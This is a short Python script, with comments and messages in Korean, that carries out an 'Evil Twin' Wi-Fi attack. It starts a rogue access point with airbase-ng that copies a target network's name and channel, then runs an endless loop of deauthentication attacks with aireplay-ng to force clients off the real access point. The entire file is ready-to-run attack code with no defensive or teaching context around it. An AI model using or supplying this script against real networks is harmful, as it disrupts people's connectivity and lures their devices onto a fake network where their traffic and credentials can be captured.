import subprocess
import time

def start_evil_twin(ssid, bssid, channel, interface="wlan0mon"):
    try:
        print(f"[*] Evil Twin 시작 - SSID: {ssid}, BSSID: {bssid}, 채널: {channel}")

        # 가짜 AP 생성
        airbase = subprocess.Popen([
            'sudo', 'airbase-ng',
            '-e', ssid,
            '-c', str(channel),
            interface
        ])
        print("[*] 가짜 AP 생성됨.")
        time.sleep(5)

        # deauth 공격 루프
        print(f"[*] {bssid} 대상 deauth 공격 시작")
        while True:
            subprocess.run([
                'sudo', 'aireplay-ng',
                '--deauth', '10',
                '-a', bssid,
                interface
            ])
            time.sleep(1)
    except Exception as e:
        print(f"[!] Evil Twin 공격 중 오류 발생: {e}")
